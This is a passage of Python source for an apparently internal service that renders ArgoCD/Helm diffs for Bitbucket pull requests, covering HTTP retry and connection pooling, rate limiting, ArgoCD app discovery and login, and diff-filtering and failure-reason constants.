    # --insecure removed: argocd.appspace.com has a valid CA-signed certificate;
    # TLS verification is enforced on both the CLI and the REST session API.
    return ["--server", ARGOCD_SERVER, "--grpc-web"]


def _argocd_subprocess_env() -> dict:
    """Return an env dict for ArgoCD subprocesses with the JWT injected as
    ARGOCD_AUTH_TOKEN so it does not appear on the command line (ps safe)."""
    env = os.environ.copy()
    if _argocd_token:
        env["ARGOCD_AUTH_TOKEN"] = _argocd_token
    return env

def _ts():
    return datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC")

# ── HTTP with retry ───────────────────────────────────────────────────
# Default SSL context verifies certificates against the system CA bundle.
# ArgoCD uses subprocess with --insecure (for its self-signed cert) so
# this context only applies to external HTTPS calls: Bitbucket and Vertex AI.
_ssl = ssl.create_default_context()

def _parse_retry_after(value):
    """Parse a Retry-After header value into seconds, or None if unusable.

    v2.5.19 (M5): RFC 7231 allows Retry-After as either delta-seconds ("120")
    or an HTTP-date ("Wed, 21 Oct 2026 07:28:00 GMT"). The old code parsed
    only the integer form, so Bitbucket's date-form rate-limit hints fell
    through to plain exponential backoff. Returns a non-negative int; a past
    date yields 0; garbage yields None so the caller keeps its own backoff.
    """
    if not value:
        return None
    value = value.strip()
    if value.isdigit():
        return int(value)
    try:
        from email.utils import parsedate_to_datetime
        when = parsedate_to_datetime(value)
        if when is None:   # pragma: no cover - modern Python raises ValueError
            return None
        if when.tzinfo is None:
            when = when.replace(tzinfo=timezone.utc)
        delta = (when - datetime.now(timezone.utc)).total_seconds()
        return max(0, int(delta))
    except (TypeError, ValueError, OverflowError):
        return None

# ── HTTP connection pooling (v2.5.20, E1) ────────────────────────────
# Every http() / raw-file call used to pay a full TCP+TLS handshake via
# urllib.request.urlopen — ~100-300ms each, times ~2-3K Bitbucket calls
# on a mass-PR pass. One persistent HTTPSConnection per (thread, host),
# kept in threading.local(), removes that overhead. Design constraints:
#   1. NEVER fail a request the old path could serve: any pool problem
#      (stale keep-alive, redirect, weird scheme, a configured proxy)
#      falls back to plain urlopen, transparently.
#   2. Error semantics identical to urlopen: non-2xx raises
#      urllib.error.HTTPError with .code/.headers/.read(), so the retry
#      and Retry-After logic in http() runs unchanged.
#   3. Stdlib only, matching the rest of the service.
#
# v2.5.21 hardening after the five-pass review of v2.5.20:
#   F3 — raw http.client ignores HTTPS_PROXY/HTTP_PROXY; urlopen honors
#        them. If a proxy is configured for the target, defer to urlopen.
#   F4 — key by HOST only (timeout set per-request on the connection),
#        not (host, timeout): the old key held two live sockets per worker
#        to the same host (http()'s 60s vs the raw fetch's 20s).
#   F2 — worker threads from ephemeral pools must run
#        _close_pooled_connections() on exit so their sockets are closed
#        deterministically instead of leaking until GC.
# Operator escape hatch: DIFF_HTTP_POOLING=off routes everything straight
# to urlopen (counted in http_pool_fallbacks).
HTTP_POOLING_ENABLED = os.environ.get(
    "DIFF_HTTP_POOLING", "on").strip().lower() not in ("off", "0", "false")

_http_conn_local = threading.local()


def _close_pooled_connections():
    """Close and drop every pooled HTTPSConnection owned by the CALLING
    thread. v2.5.21 (F2): ephemeral ThreadPoolExecutors reap their workers
    when torn down; without this the workers' keep-alive sockets stayed
    open until GC, leaking file descriptors across a mass-PR pass. Cheap,
    idempotent, and safe to call on a thread that never pooled anything."""
    pool = getattr(_http_conn_local, "conns", None)
    if not pool:
        return
    for conn in list(pool.values()):
        try:
            conn.close()
        except Exception:
            pass
    pool.clear()


class _PooledResponse:
    """Minimal urlopen-response stand-in: context manager + read().
    The body is pre-read (required to make the connection reusable), so
    read() just returns the cached bytes."""
    def __init__(self, status, headers, body):
        self.status = status
        self.headers = headers
        self._body = body

    def read(self):
        return self._body

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        return False


def _proxy_for_host(host):
    """Return a proxy URL if a REAL HTTP(S) proxy is configured for `host`,
    else None. v2.5.22 (P3-fix): the v2.5.21 guard used
    urllib.request.getproxies(), which treats ANY env var ending in `_proxy`
    as a proxy. Kubernetes injects service-discovery vars like
    ARGOCD_AGENT_REDIS_PROXY=<pod-ip> (for a Service named
    `argocd-agent-redis-proxy`), so getproxies() returned bogus entries and
    the guard silently disabled ALL pooling in production — observed live via
    /stats (fallbacks climbing, reuses/fresh stuck at 0). So we check ONLY the
    canonical proxy vars and honor NO_PROXY for the target host."""
    def _env(*names):
        for n in names:
            v = os.environ.get(n) or os.environ.get(n.lower())
            if v:
                return v
        return None
    proxy = _env("HTTPS_PROXY") or _env("ALL_PROXY")
    if not proxy:
        return None
    no_proxy = _env("NO_PROXY") or ""
    if no_proxy.strip() == "*":
        return None
    host = (host or "").lower()
    for entry in no_proxy.split(","):
        entry = entry.strip().lstrip(".").lower()
        if entry and (host == entry or host.endswith("." + entry)):
            return None
    return proxy


def _pooled_urlopen(req, timeout=60):
    """urlopen drop-in that reuses one HTTPSConnection per (thread, host).
    Falls back to urllib.request.urlopen(context=_ssl) whenever the pooled
    path cannot serve the request safely (pooling off, non-HTTPS, a
    configured proxy, redirects, or a repeated connection failure)."""
    parsed = urllib.parse.urlsplit(req.full_url)
    # P3: if a REAL proxy applies to this host, urllib.request handles it and
    # raw http.client does not — defer so we never silently bypass it. Uses a
    # strict proxy check, NOT getproxies() (see _proxy_for_host / v2.5.22).
    if (not HTTP_POOLING_ENABLED or parsed.scheme != "https"
            or _proxy_for_host(parsed.hostname)):
        _diff_stats["http_pool_fallbacks"] += 1
        return urllib.request.urlopen(req, context=_ssl, timeout=timeout)

    pool = getattr(_http_conn_local, "conns", None)
    if pool is None:
        pool = _http_conn_local.conns = {}
    key = parsed.netloc                       # F4: host only, not (host, timeout)
    path = parsed.path or "/"
    if parsed.query:
        path += "?" + parsed.query

    for fresh in (False, True):
        conn = pool.get(key)
        reused = conn is not None and not fresh
        if conn is None or fresh:
            if conn is not None:   # pragma: no cover - unreachable: any exit
                # from a prior iteration that could leave conn non-None here
                # always pool.pop()s the key first (see the except block
                # below), so by the time a fresh=True pass re-checks
                # pool.get(key) it is always None already.
                try:
                    conn.close()
                except Exception:
                    pass
            conn = _http_client.HTTPSConnection(
                parsed.netloc, timeout=timeout, context=_ssl)
            pool[key] = conn
            _diff_stats["http_pool_fresh_conns"] += 1
        else:
            # F4: reused socket — apply THIS call's timeout to it.
            try:
                conn.timeout = timeout
                if conn.sock is not None:
                    conn.sock.settimeout(timeout)
            except Exception:
                pass
        try:
            conn.request(req.get_method(), path, body=req.data,
                         headers=dict(req.header_items()))
            resp = conn.getresponse()
            body = resp.read()   # drain fully so the connection is reusable
            status = resp.status
            headers = resp.headers
        except Exception:
            # Stale keep-alive, half-closed socket, anything: drop the
            # connection. A REUSED connection retries once on a fresh one
            # (the stale keep-alive case). A FRESH connection that fails has
            # nothing to gain from a second fresh attempt (F1-review Pass A:
            # that just tripled outage latency), so it goes straight to the
            # urllib fallback.
            try:
                conn.close()
            except Exception:
                pass
            pool.pop(key, None)
            if fresh or not reused:
                _diff_stats["http_pool_fallbacks"] += 1
                return urllib.request.urlopen(
                    req, context=_ssl, timeout=timeout)
            continue
        if 300 <= status < 400:
            # http.client does not follow redirects; urlopen does. Rare on
            # the Bitbucket API, but correctness beats the saved handshake.
            _diff_stats["http_pool_fallbacks"] += 1
            return urllib.request.urlopen(req, context=_ssl, timeout=timeout)
        if status >= 400:
            raise urllib.error.HTTPError(
                req.full_url, status, getattr(resp, "reason", ""),
                headers, _io.BytesIO(body))
        if reused:
            _diff_stats["http_pool_reuses"] += 1
        return _PooledResponse(status, headers, body)
    # Unreachable: the fresh=True iteration always returns or raises.

def _is_bb_url(url):
    """True when this URL targets the Bitbucket API.

    http() is not Bitbucket-only: it also serves the GCP metadata server and
    Vertex AI. A 429 from those says nothing about our Bitbucket budget, so
    only Bitbucket calls may join (or trip) the shared rate-limit gate.
    Exact netloc match, so `api.bitbucket.org.evil.test` does not qualify.
    """
    try:
        return urllib.parse.urlsplit(url).netloc == "api.bitbucket.org"
    except ValueError:
        return False


def _log_endpoint(url):
    """The path of a URL, for logs. Bitbucket URLs are mostly boilerplate.

    v2.13.1 (COPS-2543): production only ever said "429 on GET", so working
    out which call was being rejected meant correlating timestamps against the
    iteration log. The path alone is enough to name it.
    """
    try:
        path = urllib.parse.urlsplit(url).path or url
    except ValueError:
        return url
    return path.replace(f"/2.0/repositories/{BB_WORKSPACE}/", "") or url


# COPS-2549: the OCI registry a chart lives in is decided by the version
# string alone, exactly as every ApplicationSet does it:
#   {{if hasSuffix "-dev" .appspace.version}}helm-oci-dev{{else}}helm-oci-release{{end}}
# Any environment in any config repo may point at either kind of package, so
# this must never be inferred from the tier or from the live app's registry.
# _run_one_diff used to read the registry from the LIVE app spec while taking
# the version from the PR, so a PR moving an environment onto a -dev chart
# asked the release registry for a tag that only exists in the dev one (live
# on acme-config-prod PRs 3808 and 3809). The main side is not safe either:
# the live app can lag behind main, and then it fails the same way. Both sides
# derive their own registry from their own version.
OCI_DEV_REGISTRY     = "helm-oci-dev.repo.appspace.com"
OCI_RELEASE_REGISTRY = "helm-oci-release.repo.appspace.com"


def _registry_for_version(version) -> str:
    """Return the OCI registry that hosts this chart version."""
    return OCI_DEV_REGISTRY if version and str(version).endswith("-dev") \
        else OCI_RELEASE_REGISTRY


# COPS-2549: identify our traffic. Everything went out as Python-urllib/3.x,
# indistinguishable from any other script in the logs, and on Bitbucket it
# also posts as a shared service account. Built from APP_VERSION so the logs
# also show which build made the call, which matters while a rollout is in
# flight. Note this cannot cover helm and argocd: they run as subprocesses and
# helm has no --user-agent flag, so registry pulls keep helm's own UA.
def _user_agent() -> str:
    return f"AppspaceAcmeDiffPreview/{APP_VERSION}"


def http(method, url, body=None, headers=None, auth=None):
    """HTTP call with exponential backoff on 429/503/network errors.

    v2.5.20 (E1): routed through _pooled_urlopen — one persistent TLS
    connection per (thread, host) instead of a fresh handshake per call.
    Error semantics are unchanged: non-2xx still raises HTTPError.

    v2.13.1 (COPS-2543): Bitbucket calls share the rate-limit gate with the
    value-file path. Every 429 seen in production came through here, and the
    old backoff could not clear a rate-limit window: Bitbucket does not send
    Retry-After on these endpoints, so `2 ** attempt` gave 1s then 2s against
    a window that runs ~60s, and both retries died inside it. Non-Bitbucket
    hosts keep the original per-request backoff untouched.
    """
    hdrs = dict(headers or {})
    hdrs.setdefault("User-Agent", _user_agent())
    if auth:
        hdrs["Authorization"] = "Basic " + _base64.b64encode(
            f"{auth[0]}:{auth[1]}".encode()).decode()
    data = json.dumps(body).encode() if body else None
    if data:
        hdrs["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
    is_bb = _is_bb_url(url)
    endpoint = _log_endpoint(url)
    last_exc = None
    for attempt in range(3):
        # Brake with the pool before spending an attempt, so a 429 that another
        # caller (or the value-file path) already hit does not cost this call a
        # retry against a window we know is closed.
        if is_bb:
            _bb_ratelimit_wait()
        try:
            with _pooled_urlopen(req, timeout=60) as r:
                return json.loads(r.read())
        except urllib.error.HTTPError as e:
            if e.code in (429, 500, 502, 503, 504) and attempt < 2:
                # v2.5.19 (M5): _parse_retry_after handles both the
                # delta-seconds and the HTTP-date form of the header.
                ra = _parse_retry_after((e.headers or {}).get("Retry-After")) \
                    if e.code == 429 else None
                if e.code == 429 and is_bb:
                    # A 429 is a property of the TOKEN, so publish the pause for
                    # everyone rather than backing off alone. Bitbucket often
                    # omits Retry-After here, hence the window-sized fallback;
                    # the cap keeps a broken header from stalling the loop.
                    wait = min(ra, BB_RATELIMIT_MAX_PAUSE) if ra is not None \
                        else BB_RATELIMIT_FALLBACK
                    log(f"[http] 429 on {method} {endpoint} — pausing all "
                        f"Bitbucket calls {wait}s (retry {attempt+1}/2)", "WARNING")
                    _bb_ratelimit_hold(wait)
                    last_exc = e
                    continue   # the gate above does the sleeping, for everyone
                # Non-Bitbucket host, or a 5xx: one sick request is not a spent
                # budget, so keep the per-request backoff and leave the pool
                # alone.
                wait = 2 ** attempt
                if ra is not None:
                    wait = max(wait, min(ra, 60))
                log(f"[http] {e.code} on {method} {endpoint} — retry {attempt+1}/2 in {wait}s",
                    "WARNING")
                time.sleep(wait)
                last_exc = e
                continue
            raise
        except (OSError, urllib.error.URLError) as e:
            if attempt < 2:
                wait = 2 ** attempt
                log(f"[http] network error on {method} {endpoint} — retry {attempt+1}/2 in {wait}s",
                    "WARNING")
                time.sleep(wait)
                last_exc = e
                continue
            raise
    raise last_exc   # pragma: no cover - unreachable: every loop iteration
    # above either returns on success or raises before reaching a natural
    # fall-through; this is a defensive guard against a future refactor.

def bb(method, path, repo=None, **kw):
    url = f"https://api.bitbucket.org/2.0/repositories/{BB_WORKSPACE}/{repo or BB_REPO}/{path}"
    _count_bb_call("rest_calls")   # COPS-2564: PR listing, comments, statuses
    return http(method, url, auth=(BB_USER, BB_TOKEN), **kw)

# ── ArgoCD dynamic discovery ──────────────────────────────────────────
def discover_path_app_map():
    """Build {repo_path -> [app_names]} from manifest-generate-paths annotations.

    All apps are multi-source with acme-config-dev as source-1.
    Apps annotated with '.' (entire repo) are excluded - none exist currently.

    Result is cached for PATH_MAP_TTL seconds. Cache is invalidated on
    argocd_login() so a re-login (session expiry) picks up new apps.
    """
    global _path_map_cache, _path_map_ts, _path_map_count, _path_map_app_count, \
           _app_chart_map, _app_chart_revision_map, _app_chart_registry_map, \
           _app_value_files_map, _app_namespace_map, _app_repo_map, _repo_path_maps
    if _path_map_cache and (time.monotonic() - _path_map_ts) < PATH_MAP_TTL:
        # Within TTL: return cached map. The self-referential app-count comparison
        # (comparing cache to itself) was removed — it could never detect new apps
        # added under existing paths between refreshes. Rely purely on TTL.
        return _path_map_cache
    r = subprocess.run(
        [ARGOCD_BIN, "app", "list", "-o", "json"] + _auth_flags(),
        capture_output=True, text=True, timeout=90,
        env=_argocd_subprocess_env())
    if r.returncode != 0:
        raise RuntimeError(f"argocd app list failed: {r.stderr[:200]}")
    try:
        raw = json.loads(r.stdout)
        # `argocd app list -o json` returns a bare array normally, but may
        # wrap it in {"items": [...]} depending on the CLI version.
        apps = raw if isinstance(raw, list) else raw.get("items", raw)
    except json.JSONDecodeError as e:
        raise RuntimeError(f"argocd app list: invalid JSON: {e}")
    path_map = {}
    chart_map = {}
    chart_rev_map = {}
    chart_reg_map = {}
    value_files_map = {}
    namespace_map = {}
    app_repo_map = {}
    repo_maps = {slug: {} for slug in REPOS}
    unknown_repos_seen = set()
    for app in apps:
        name = app["metadata"]["name"]
        ns   = app["metadata"].get("namespace", "")
        full_name = f"{ns}/{name}" if ns and ns != "argocd" else name
        chart, chart_rev, chart_reg, value_files = _extract_app_chart_info(app)
        if chart:
            chart_map[full_name] = chart
        if chart_rev:
            chart_rev_map[full_name] = chart_rev
        if chart_reg:
            chart_reg_map[full_name] = chart_reg
        if value_files:
            value_files_map[full_name] = value_files
        dest = app.get("spec", {}).get("destination", {})
        if dest.get("namespace"):
            namespace_map[full_name] = dest["namespace"]
        # COPS-2507 multi-repo: record which git config repo this app renders
        # from (sources[0], the `ref: config` git source). A PR in repo R may
        # only ever match apps whose git source is R — makes cross-repo
        # fetches/comments structurally impossible, not merely unlikely.
        app_repo = _extract_app_git_repo(app)
        if app_repo:
            app_repo_map[full_name] = app_repo
            if app_repo not in repo_maps and app_repo not in unknown_repos_seen:
                unknown_repos_seen.add(app_repo)
                debug(f"path map: app {full_name} uses unconfigured repo "
                      f"{app_repo} — visible only if added to DIFF_REPOS")
        ann  = app.get("metadata", {}).get("annotations", {})
        raw  = ann.get("argocd.argoproj.io/manifest-generate-paths", "")
        if not raw:
            continue
        for p in raw.split(";"):
            p = posixpath.normpath(p.strip()).lstrip("/")
            if p and p != ".":
                path_map.setdefault(p, [])
                if full_name not in path_map[p]:
                    path_map[p].append(full_name)
                if app_repo in repo_maps:
                    rm = repo_maps[app_repo]
                    rm.setdefault(p, [])
                    if full_name not in rm[p]:
                        rm[p].append(full_name)
    _path_map_cache          = path_map
    _app_chart_map           = chart_map
    _app_chart_revision_map  = chart_rev_map
    _app_chart_registry_map  = chart_reg_map
    _app_value_files_map     = value_files_map
    _app_namespace_map       = namespace_map
    _app_repo_map            = app_repo_map
    _repo_path_maps          = repo_maps
    _path_map_ts        = time.monotonic()
    _path_map_count     = len(path_map)
    _path_map_app_count = sum(len(v) for v in path_map.values())
    return path_map


def path_map_for_repo(repo_slug):
    """Return the per-repo partition of the path map (COPS-2507).

    Calls discover_path_app_map() first so TTL/refresh semantics are shared.
    Unknown/unconfigured repos get an empty map — a PR there can never match.
    """
    discover_path_app_map()
    return _repo_path_maps.get(repo_slug, {})


def _extract_app_git_repo(app):
    """Return the config repo slug for an app's git source, or None.

    The git source is the one WITHOUT a chart (multi-source apps: source-1 is
    the git config repo providing value files via the $config alias). repoURL
    formats seen live: git@bitbucket.org:appspace-cloud/acme-config-dev and
    https://bitbucket.org/appspace-cloud/acme-config-dev(.git).
    """
    spec = app.get("spec", {})
    srcs = spec.get("sources") or ([spec["source"]] if spec.get("source") else [])
    for s in srcs:
        if s.get("chart"):
            continue
        repo_url = (s.get("repoURL") or "").strip().rstrip("/")
        if not repo_url:
            continue
        if repo_url.endswith(".git"):
            repo_url = repo_url[:-4]
        slug = repo_url.split("/")[-1]
        # git@host:workspace/slug has the slug after the last '/', same rule.
        return slug or None
    return None


def _extract_app_chart_info(app):
    """Return (chart_name, targetRevision, registry_host, value_files) for an app's OCI source.

    Apps are multi-source: source-1 is the git config repo (provides value files via $config
    alias), source-2 is the OCI Helm chart. There are two registries:
      helm-oci-dev.repo.appspace.com     — dev charts
      helm-oci-release.repo.appspace.com — released/stable charts (stage, prod)
    Both use the same credentials (OCI_USER / OCI_PASS env vars).

    Returns (None, None, None, []) when no OCI source is found.
    """
    spec = app.get("spec", {})
    srcs = spec.get("sources") or ([spec["source"]] if spec.get("source") else [])
    for s in srcs:
        chart = s.get("chart")
        if chart:
            repo_url = s.get("repoURL", "")
            # Strip scheme if present (repoURL may be bare hostname or oci:// URL)
            registry = repo_url.replace("oci://", "").split("/")[0]
            value_files = s.get("helm", {}).get("valueFiles", [])
            return chart, s.get("targetRevision"), registry, value_files
    return None, None, None, []


def _match_files_to_apps(changed_files, path_map):
    """Single O(files x paths) pass matching changed files to affected apps.

    PERF FIX (v2.4.8): previously get_affected_apps() did this scan once per
    PR, and _pr_chart_revision() independently redid an equivalent scan once
    PER AFFECTED APP -- O(apps x files x paths) total. Measured with a
    realistic 600-app fleet: 413ms of pure CPU per PR just for version-bump
    detection, before any network calls. This computes the match ONCE and
    returns both the affected-apps list and a per-app file list, so every
    caller reuses the same result instead of recomputing it.

    Preserves the original union semantics: a file with no exact path_map key
    is checked against EVERY path_map entry (not just the first match), since
    a single file can legitimately belong to more than one path prefix.

    Returns (affected_apps: sorted list[str], app_to_files: dict[str, list[str]]).
    """
    app_to_files: dict = {}
    for f in changed_files:
        exact = path_map.get(f)
        if exact is not None:
            matched_apps = exact
        else:
            matched = set()
            for p, app_list in path_map.items():
                if f.startswith(p + "/") or p.startswith(f + "/"):
                    matched.update(app_list)
            matched_apps = matched
        for app in matched_apps:
            app_to_files.setdefault(app, []).append(f)
    return sorted(app_to_files), app_to_files


def get_affected_apps(changed_files, path_map):
    """Return sorted app names whose manifest-generate-paths overlap with changed files."""
    affected, _ = _match_files_to_apps(changed_files, path_map)
    return affected


# ── ArgoCD login (used only for app discovery, never for the diff itself) ──
# We avoid passing ARGOCD_PASS as a CLI arg (visible in ps aux). Instead, call
# the ArgoCD REST API to get a JWT, store it in a module-level variable, and
# pass it via --auth-token in every argocd CLI call. The token does not appear
# in the process argv because it is stored in module memory, not in a shell
# environment variable that could be inherited by unrelated processes.
_argocd_token: str = ""
_argocd_token_ts: float = 0.0   # monotonic time of last successful token fetch
# Proactively refresh the JWT every ARGOCD_TOKEN_TTL seconds so it never expires
# mid-iteration. ArgoCD default JWT lifetime is 24h; refresh at 12h leaves margin.
ARGOCD_TOKEN_TTL = _env_int("ARGOCD_TOKEN_TTL", 12 * 3600)


def _argocd_fetch_token() -> str:
    """Call ArgoCD REST API to get a session JWT. Returns the raw token string.

    DUPLICATED LOGIC: dev_hard_refresh.py has an identical implementation
    (_fetch_argocd_token). That script is deliberately standalone (the
    CronJob runs it as a single file, no imports from this service), so the
    duplication is accepted on purpose. If the ArgoCD session endpoint,
    auth payload, or TLS handling changes, UPDATE BOTH copies.
    """
    url  = f"https://{ARGOCD_SERVER}/api/v1/session"
    data = json.dumps({"username": ARGOCD_USER, "password": ARGOCD_PASS}).encode()
    req  = urllib.request.Request(
        url, data=data,
        headers={"Content-Type": "application/json"},
        method="POST")
    # Use default SSL context: enforces CA verification for argocd.appspace.com
    # (cert issued by Google Trust Services, valid CA chain in the container).
    ssl_ctx = ssl.create_default_context()
    with urllib.request.urlopen(req, context=ssl_ctx, timeout=30) as resp:
        return json.loads(resp.read())["token"]


def argocd_login():
    global _ready, _path_map_ts, _path_map_count, _path_map_app_count, \
           _argocd_token, _argocd_token_ts, _consecutive_login_fails
    try:
        _argocd_token = _argocd_fetch_token()
    except Exception as e:
        _consecutive_login_fails += 1
        log(f"ArgoCD login failed (attempt {_consecutive_login_fails}): {e}", "ERROR")
        if _consecutive_login_fails >= LOGIN_FAIL_THRESHOLD:
            _ready = False
            log(f"ArgoCD login failed {_consecutive_login_fails} times — "
                f"readiness cleared; pod may be restarted by readiness probe.", "ERROR")
        raise
    _consecutive_login_fails = 0
    _argocd_token_ts    = time.monotonic()
    _path_map_ts        = 0.0  # Invalidate path map cache on re-login.
    _path_map_count     = 0
    _path_map_app_count = 0
    _ready = True
    log(f"ArgoCD auth: JWT obtained for {ARGOCD_USER} (no password on CLI)")

# Resource patterns filtered from ALL diff output and AI analysis.
# micro-versions-info is an auto-generated ConfigMap that always changes
# alongside actual image updates — it lists all deployed image versions.
# Showing it adds noise: the real change is visible in the Deployment diff.
# Checksum annotations that cascade from it are also suppressed.
def _diff_ignore_patterns(env_value=None):
    """Built-in noise-resource substrings plus any from DIFF_IGNORE_RESOURCES.

    v2.5.19 (E2): the list used to be a hardcoded constant, so silencing the
    next noisy auto-generated resource meant a full release. DIFF_IGNORE_RESOURCES
    (comma-separated substrings) is merged in on top of the built-in default,
    letting an operator react immediately. Blank entries are dropped.
    """
    base = ["micro-versions-info"]
    raw = env_value if env_value is not None else os.environ.get("DIFF_IGNORE_RESOURCES", "")
    extra = [p.strip() for p in raw.split(",") if p.strip()]
    # de-dup while preserving order
    seen, out = set(), []
    for p in base + extra:
        if p not in seen:
            seen.add(p)
            out.append(p)
    return out

DIFF_IGNORE_RESOURCE_PATTERNS = _diff_ignore_patterns()

def _is_checksum_only_section(body: str) -> bool:
    """True when every changed line is a checksum/tracking annotation only.

    These sections appear in Deployments as cascading side-effects of ConfigMap
    changes. They carry no operator-useful information. Extended to cover helm
    template output which includes argocd.argoproj.io/tracking-id and similar
    annotations that always drift between renders.
    """
    _ANNOTATION_NOISE = (
        "checksum/",
        "argocd.argoproj.io/tracking-id",
        "kubectl.kubernetes.io/last-applied-configuration",
        "deployment.kubernetes.io/revision",
        "meta.helm.sh/release-",
        "helm.sh/resource-policy",
        "helm.sh/chart",
    )
    changed = []
    for l in body.splitlines():
        # Skip difflib unified-diff structural lines (---, +++, @@ hunk headers);
        # they start with -/+ but are not content changes.
        if l.startswith("---") or l.startswith("+++") or l.startswith("@@"):
            continue
        if l.startswith("< ") or l.startswith("> ") or l.startswith("-") or l.startswith("+"):
            stripped = l.lstrip("+-< >").strip()
            if stripped:
                changed.append(stripped)
    return bool(changed) and all(
        any(noise in l for noise in _ANNOTATION_NOISE) for l in changed
    )

def _filter_diff_sections(sections: list) -> list:
    """Remove noisy sections from a parsed diff section list.

    Removes:
    1. Any section whose header matches DIFF_IGNORE_RESOURCE_PATTERNS.
    2. Any section whose only diff lines are checksum annotation changes
       (these are always cascading effects of filtered ConfigMap changes).
    """
    result = []
    for header, body in sections:
        if any(pat in header for pat in DIFF_IGNORE_RESOURCE_PATTERNS):
            continue
        if _is_checksum_only_section(body):
            continue
        result.append((header, body))
    return result

# ── Diff outcome model ────────────────────────────────────────────────
# Every diff resolves to exactly one outcome. Only DIFF and NO_DIFF are
# trustworthy answers; INDETERMINATE means "we could not compute the diff"
# and is shown distinctly so a failed render is never mistaken for "no change".
OUT_DIFF          = "diff"
OUT_NO_DIFF       = "no_diff"
OUT_INDETERMINATE = "indeterminate"
OUT_ERROR         = "error"
OUT_DECOMMISSIONED = "decommissioned"

# Structured result of a single argocd_diff() call.
#   text     : reconstructed diff text, already truncated to MAX_RESOURCES_FULL
#              sections and MAX_DIFF_CHARS per section (only for OUT_DIFF)
#   sections : pre-parsed filtered sections [(header, body)] — computed once
#              in argocd_diff and reused everywhere (never call parse_diff_sections
#              on result.text again).
#   n_res    : total number of differing resources (including ones not in text)
#   has_diff : True only for OUT_DIFF (kept for readability at call sites)
#   error    : human-readable detail for INDETERMINATE / ERROR, else None
#   outcome  : one of the OUT_* constants
#   reason   : short machine code for logs/metrics
DiffResult = namedtuple("DiffResult",
                        ["text", "sections", "n_res", "has_diff", "error", "outcome", "reason",
                         "version_change", "deleted_resources", "replicas_zeroed",
                         "fingerprint", "renamed_resources", "vm_changes",
                         "version_fold"],
                        defaults=[None, None, None, None, None, None, None])
# vm_changes: structured facts about KCC linux-services (VM) resources this
# diff touches, extracted by _detect_vm_changes on the FULL pre-cap section
# list (same design as deleted_resources: safety facts never depend on
# display caps). None on non-OUT_DIFF outcomes and legacy/coerced results.
# fingerprint (COPS-2579): stable hash of this app's FULL (pre-cap) section
# list, set only on the OUT_DIFF success path. Two apps whose changes are
# byte-for-byte identical (a shared ancestor-file edit rolled out the same
# way to many environments, e.g. acme-config-prod PR #3837 touching 248
# apps with the identical 67-resource change) get the SAME fingerprint, so
# format_comment can group them and show one full representative diff
# instead of many arbitrary truncated duplicates. None on every other
# outcome and on legacy/coerced results (_result()) — those never group.

# version_fold: which of this app's sections are provably version-bump
# noise (see _classify_version_fold), computed pre-cap like every other
# safety fact. None on non-OUT_DIFF outcomes and legacy/coerced results.

# version_change (v2.5.8): (main_rev, pr_rev) when the PR changes this app's
# chart targetRevision, else None. Lets format_comment shout on downgrades.
# It has a default so the many existing 7-positional-arg constructions keep
# working unchanged.

# ── Diff failure reasons (helm-template architecture) ─────────────────
# The diff is a pure local `helm pull` + `helm template` + Python YAML diff.
# It never talks to a spoke agent, so the only failures are: OCI pull/login,
# chart version missing, value-file fetch from Bitbucket, the local render, or
# a timeout. Each is one of the codes below. The old argocd-agent reasons
# (redis_timeout, managed_no_cache, manifests_5xx, server_unavailable, ...) can
# no longer occur and were removed.
REASON_OCI_NOT_FOUND = "oci_not_found"      # version absent in registry — PERMANENT, blocks PR
REASON_OCI_PULL      = "oci_pull_failed"    # transient pull/login failure — retry
REASON_METADATA      = "metadata_pending"   # app not yet in the 5-min app cache — retry
REASON_RENDER        = "render_failed"      # `helm template` failed (bad values/chart) — soft
REASON_TIMEOUT       = "timeout"            # a step exceeded DIFF_TIMEOUT — retry
# An unhandled exception inside run_diff/argocd_diff itself (bug, unexpected
# API shape, etc.) — not one of the known, classified failure modes above.
# Added in v2.4.8 so process_batch can record a per-app crash and continue
# the rest of the batch instead of letting the exception abort it entirely.
REASON_UNEXPECTED    = "unexpected_error"
# The PR sets appspace.version to a value that is not a safe OCI tag
# (path traversal, leading dash, whitespace, shell metachars). The value is
# author-controlled and reaches `helm pull --version` / a filesystem path, so
# it is rejected. This is PERMANENT and blocks the PR: previously it was
# indistinguishable from "no version bump" and produced a green "no changes"
# comment, hiding the rejection from reviewers (v2.4.9).
REASON_INVALID_VERSION = "invalid_version"
REASON_NAME_TOO_LONG   = "name_too_long"      # COPS-2552: derived GCP service account name rejected
# `helm template` failed specifically because a value file is not parseable
# YAML (as opposed to a valid-but-incomplete chart render). Distinct hint so
# the author knows to fix their YAML syntax rather than chart values (v2.4.9).
REASON_INVALID_YAML  = "invalid_yaml"
REASON_MISSING_REQUIRED = "missing_required"  # v2.6.2: helm `required`/nil-deref on absent value
REASON_SCHEMA_INVALID   = "schema_invalid"     # COPS-2554: values.schema.json validation failed

# Reasons worth retrying in-process with backoff (transient).
# REASON_RENDER is retried once — a brief subprocess glitch (node IO, tmp
# exhaustion) should not produce a permanent "diff unavailable" result.
RETRYABLE_REASONS = {REASON_OCI_PULL, REASON_METADATA, REASON_TIMEOUT, REASON_RENDER}
# Reasons that permanently block the PR (the deployer would fail the same way).
PERMANENT_REASONS = {REASON_OCI_NOT_FOUND, REASON_INVALID_VERSION,
                     REASON_INVALID_YAML, REASON_MISSING_REQUIRED,
                     REASON_SCHEMA_INVALID, REASON_NAME_TOO_LONG}
# COPS-2552: a name that violates GCP's IAMServiceAccount id rules is exactly
# as deterministic as an invalid chart version or invalid YAML -- it cannot
# resolve on retry, only on a new commit that shortens the name. Helm renders
# it fine and ArgoCD applies it successfully (both only see a valid k8s
# object name), so this is the one class of failure no render- or sync-based
# check could ever catch; only an explicit assertion on the declared name
# does. See _check_customer_name (COPS-2562, the cheap successor of
# COPS-2552's _check_gsa_name).
# COPS-2554: MISSING_REQUIRED and SCHEMA_INVALID joined the permanent set
# alongside invalid_yaml/invalid_version. All four are deterministic given
# the same pr_sha -- an environment missing a required value, or violating
# the chart schema, will never resolve on retry, only on a new commit. Before
# this they fell through as ordinary soft-indeterminate: retried up to
# DIFF_RETRIES times per pass (wasted time on a certain failure) and then
# backed off forever across iterations instead of blocking cleanly with a
# FAILED status that tells the author what to fix.

# Operator-friendly one-liners shown in the PR comment for each reason.
# The full stderr is in the pod logs at LOG_LEVEL=DEBUG.
_REASON_HINTS = {
    REASON_OCI_NOT_FOUND: "Chart version not found in OCI registry — check that the version exists",
